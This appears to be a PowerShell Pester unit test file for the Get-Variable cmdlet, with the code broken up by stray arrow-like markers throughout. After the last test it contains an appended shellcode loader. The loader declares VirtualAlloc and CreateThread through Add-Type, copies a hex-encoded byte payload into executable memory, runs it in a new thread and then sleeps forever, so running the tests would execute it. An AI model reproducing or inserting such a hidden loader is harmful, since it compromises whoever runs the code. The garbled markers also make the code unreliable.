


 -||-> Describe "Get-Variable DRT Unit Tests" -Tags "CI" {
	 -||-> It "Get-Variable of not existing variable Name should throw ItemNotFoundException"{
		 -||-> {  -||-> Get-Variable -ErrorAction Stop -Name nonexistingVariableName <-||-  } |
			Should -Throw -ErrorId "VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand" <-||- 
	} <-||- 

	 -||-> It "Get-Variable of existing variable Name with include and bogus exclude should work"{
		 -||-> Set-Variable newVar testing <-||- 
		 -||-> $var1= -||-> get-variable -Name newVar -Include newVar -Exclude bogus <-||-  <-||- 
		 -||-> $var1.Name|Should -BeExactly "newVar" <-||- 
		 -||-> $var1.Value|Should -BeExactly "testing" <-||- 
	} <-||- 

	 -||-> It "Get-Variable of existing variable Name with Description and Option should work"{
		 -||-> Set-Variable newVar testing -Option ReadOnly -Description "testing description" <-||- 
		 -||-> $var1= -||-> get-variable -Name newVar <-||-  <-||- 
		 -||-> $var1.Name|Should -BeExactly "newVar" <-||- 
		 -||-> $var1.Value|Should -BeExactly "testing" <-||- 
		 -||-> $var1.Options|Should -BeExactly "ReadOnly" <-||- 
		 -||-> $var1.Description|Should -BeExactly "testing description" <-||- 
	} <-||- 

	 -||-> It "Get-Variable of existing variable Globbing Name should work"{
		 -||-> Set-Variable abcaVar testing <-||- 
		 -||-> Set-Variable bcdaVar "another test" <-||- 
		 -||-> Set-Variable aVarfoo wow <-||- 
		 -||-> $var1= -||-> get-variable -Name *aVar* -Scope local <-||-  <-||- 
		 -||-> $var1.Count | Should -Be 3 <-||- 
		 -||-> $var1[0].Name|Should -BeExactly "abcaVar" <-||- 
		 -||-> $var1[0].Value|Should -BeExactly "testing" <-||- 
		 -||-> $var1[1].Name|Should -BeExactly "aVarfoo" <-||- 
		 -||-> $var1[1].Value|Should -BeExactly "wow" <-||- 
		 -||-> $var1[2].Name|Should -BeExactly "bcdaVar" <-||- 
		 -||-> $var1[2].Value|Should -BeExactly "another test" <-||- 
	} <-||- 

	 -||-> It "Get-Variable of existing private variable Name should throw ItemNotFoundException"{
		 -||-> Set-Variable newVar testing -Option Private <-||- 
		 -||-> { -||-> Get-Variable -Name newVar -ErrorAction Stop <-||- } |
			Should -Throw -ErrorId "VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand" <-||- 
	} <-||- 
} <-||- 

 -||-> Describe "Get-Variable" -Tags "CI" {
     -||-> It "Should be able to call with no parameters without error" {
		 -||-> {  -||-> Get-Variable <-||-  } | Should -Not -Throw <-||- 
    } <-||- 

     -||-> It "Should return environment variables when called with no parameters" {
		 -||-> ( -||-> Get-Variable <-||- ).Name -contains "$" | Should -BeTrue <-||- 
		 -||-> ( -||-> Get-Variable <-||- ).Name -contains "?" | Should -BeTrue <-||- 
		 -||-> ( -||-> Get-Variable <-||- ).Name -contains "HOST" | Should -BeTrue <-||- 
		 -||-> ( -||-> Get-Variable <-||- ).Name -contains "PWD" | Should -BeTrue <-||- 
		 -||-> ( -||-> Get-Variable <-||- ).Name -contains "PID" | Should -BeTrue <-||- 
		 -||-> ( -||-> Get-Variable <-||- ).Name -contains "^" | Should -BeTrue <-||- 
    } <-||- 

     -||-> It "Should return the value of an object" {
		 -||-> New-Variable -Name tempVar -Value 1 <-||- 
		 -||-> ( -||-> Get-Variable tempVar <-||- ).Value | Should -Be ( -||-> 1 <-||- ) <-||- 
    } <-||- 

     -||-> It "Should be able to call using the Name switch" {
		 -||-> New-Variable -Name var1 -Value 4 <-||- 

		 -||-> {  -||-> Get-Variable -Name var1 <-||-  } | Should -Not -Throw <-||- 

		 -||-> ( -||-> Get-Variable -Name var1 <-||- ).Value | Should -Be 4 <-||- 

		 -||-> Remove-Variable var1 <-||- 
    } <-||- 

     -||-> It "Should be able to use wildcard characters in the Name field" {
		 -||-> New-Variable -Name var1 -Value 4 <-||- 
		 -||-> New-Variable -Name var2 -Value "test" <-||- 

		 -||-> ( -||-> Get-Variable -Name var* <-||- ).Value[0] | Should -Be 4 <-||- 
		 -||-> ( -||-> Get-Variable -Name var* <-||- ).Value[1] | Should -BeExactly "test" <-||- 

		 -||-> Remove-Variable var1 <-||- 
		 -||-> Remove-Variable var2 <-||- 
    } <-||- 

     -||-> It "Should return only the value if the value switch is used" {
		 -||-> New-Variable -Name var1 -Value 4 <-||- 

		 -||-> Get-Variable -Name var1 -ValueOnly | Should -Be 4 <-||- 

		 -||-> Remove-Variable var1 <-||- 
    } <-||- 

     -||-> It "Should pipe string to the name field without the Name field being specified"{
		 -||-> New-Variable -Name var1 -Value 3 <-||- 

		 -||-> ( -||-> "var1" | Get-Variable <-||-  ).Value | Should -Be 3 <-||- 

		 -||-> Remove-Variable var1 <-||- 
    } <-||- 

     -||-> It "Should be able to include a set of variables to get" {
		 -||-> New-Variable -Name var1 -Value 4 <-||- 
		 -||-> New-Variable -Name var2 -Value 2 <-||- 

		 -||-> $actual =  -||-> Get-Variable -Include var1, var2 <-||-  <-||- 

		 -||-> $actual[0].Name | Should -Be var1 <-||- 
		 -||-> $actual[1].Name | Should -Be var2 <-||- 

		 -||-> $actual[0].Value | Should -Be 4 <-||- 
		 -||-> $actual[1].Value | Should -Be 2 <-||- 

		 -||-> Remove-Variable var1 <-||- 
		 -||-> Remove-Variable var2 <-||- 
    } <-||- 

     -||-> It "Should be able to exclude a set of variables to get" {
		 -||-> New-Variable -Name var1 -Value 4 <-||- 
		 -||-> New-Variable -Name var2 -Value 2 <-||- 
		 -||-> New-Variable -Name var3 -Value "test" <-||- 

		 -||-> $actual =  -||-> Get-Variable -Exclude var1, var2 <-||-  <-||- 

		 -||-> $actual.Name -contains "var3" | Should -BeTrue <-||- 
    } <-||- 

     -||-> Context "Scope Tests" {
	
	 -||-> It "Should be able to get a global scope variable using the global switch" {
	     -||-> New-Variable globalVar -Value 1 -Scope global -Force <-||- 

	     -||-> ( -||-> Get-Variable -Name globalVar -Scope global <-||- ).Value | Should -Be 1 <-||- 
	} <-||- 

	 -||-> It "Should not be able to clear a global scope variable using the local switch" {
	     -||-> New-Variable globalVar -Value 1 -Scope global -Force <-||- 

	     -||-> {  -||-> Get-Variable -Name globalVar -Scope local -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "VariableNotFound,Microsoft.PowerShell.Commands.GetVariableCommand" <-||- 
	} <-||- 

	 -||-> It "Should be able to get a global variable when there's one in the script scope" {
	     -||-> New-Variable globalVar -Value 1 -Scope global -Force <-||- 
	     -||-> {  -||-> New-Variable globalVar -Value 2 -Scope script -Force <-||- } <-||- 

	     -||-> ( -||-> Get-Variable -Name globalVar <-||- ).Value | Should -Be 1 <-||- 
	} <-||- 

	 -||-> It "Should be able to get an item locally using the local switch" {
	     -||-> {
		 -||-> New-Variable localVar -Value 1 -Scope local -Force <-||- 

		 -||-> Get-Variable -Name localVar -Scope local <-||- 
	    } | Should -Not -Throw <-||- 
	} <-||- 

	 -||-> It "Should be able to get a variable created in the global scope when there's one in local scope" {
	     -||-> New-Variable localVar -Value 1 -Scope local -Force <-||- 

	     -||-> New-Variable localVar -Value 2 -Scope global -Force <-||- 

	     -||-> ( -||-> Get-Variable -Name localVar -Scope global <-||- ).Value | Should -Be 2 <-||- 
	} <-||- 

	 -||-> It "Should be able to get a script variable created using the script switch" {
	     -||-> {
		 -||-> New-Variable scriptVar -Value 1 -Scope script -Force <-||- 

		 -||-> Get-Variable -Name scriptVar -Scope script <-||- 
	    } | Should -Not -Throw <-||- 
	} <-||- 

	 -||-> It "Should be able to clear a global script variable that was created using the script scope switch" {
	     -||-> {
		 -||-> New-Variable scriptVar -Value 1 -Scope script -Force <-||- 

		 -||-> Get-Variable -Name scriptVar -Scope script <-||- 
	    } | Should -Not -Throw <-||- 
	} <-||- 
    } <-||- 
} <-||- 

 -||-> $oTvt = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $oTvt -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x42,0x8c,0x13,0x6b,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x55,0x0f,0x03,0x55,0x4d,0x6e,0xe6,0x97,0xb9,0xec,0x09,0x68,0x39,0x91,0x80,0x8d,0x08,0x91,0xf7,0xc6,0x3a,0x21,0x73,0x8a,0xb6,0xca,0xd1,0x3f,0x4d,0xbe,0xfd,0x30,0xe6,0x75,0xd8,0x7f,0xf7,0x26,0x18,0xe1,0x7b,0x35,0x4d,0xc1,0x42,0xf6,0x80,0x00,0x83,0xeb,0x69,0x50,0x5c,0x67,0xdf,0x45,0xe9,0x3d,0xdc,0xee,0xa1,0xd0,0x64,0x12,0x71,0xd2,0x45,0x85,0x0a,0x8d,0x45,0x27,0xdf,0xa5,0xcf,0x3f,0x3c,0x83,0x86,0xb4,0xf6,0x7f,0x19,0x1d,0xc7,0x80,0xb6,0x60,0xe8,0x72,0xc6,0xa5,0xce,0x6c,0xbd,0xdf,0x2d,0x10,0xc6,0x1b,0x4c,0xce,0x43,0xb8,0xf6,0x85,0xf4,0x64,0x07,0x49,0x62,0xee,0x0b,0x26,0xe0,0xa8,0x0f,0xb9,0x25,0xc3,0x2b,0x32,0xc8,0x04,0xba,0x00,0xef,0x80,0xe7,0xd3,0x8e,0x91,0x4d,0xb5,0xaf,0xc2,0x2e,0x6a,0x0a,0x88,0xc2,0x7f,0x27,0xd3,0x8a,0x4c,0x0a,0xec,0x4a,0xdb,0x1d,0x9f,0x78,0x44,0xb6,0x37,0x30,0x0d,0x10,0xcf,0x37,0x24,0xe4,0x5f,0xc6,0xc7,0x15,0x49,0x0c,0x93,0x45,0xe1,0xa5,0x9c,0x0d,0xf1,0x4a,0x49,0xbb,0xf4,0xdc,0x78,0x3c,0xfd,0x12,0x15,0x3e,0x01,0x3b,0xb9,0xb7,0xe7,0x6b,0x11,0x98,0xb7,0xcb,0xc1,0x58,0x68,0xa3,0x0b,0x57,0x57,0xd3,0x33,0xbd,0xf0,0x79,0xdc,0x68,0xa8,0x15,0x45,0x31,0x22,0x84,0x8a,0xef,0x4e,0x86,0x01,0x1c,0xae,0x48,0xe2,0x69,0xbc,0x3c,0x02,0x24,0x9e,0xea,0x1d,0x92,0xb5,0x12,0x88,0x19,0x1c,0x45,0x24,0x20,0x79,0xa1,0xeb,0xdb,0xac,0xba,0x22,0x4e,0x0f,0xd4,0x4a,0x9e,0x8f,0x24,0x1d,0xf4,0x8f,0x4c,0xf9,0xac,0xc3,0x69,0x06,0x79,0x70,0x22,0x93,0x82,0x21,0x97,0x34,0xeb,0xcf,0xce,0x73,0xb4,0x30,0x25,0x82,0x88,0xe6,0x03,0xf0,0xe0,0x3a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $6bu=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $6bu.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$6bu,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



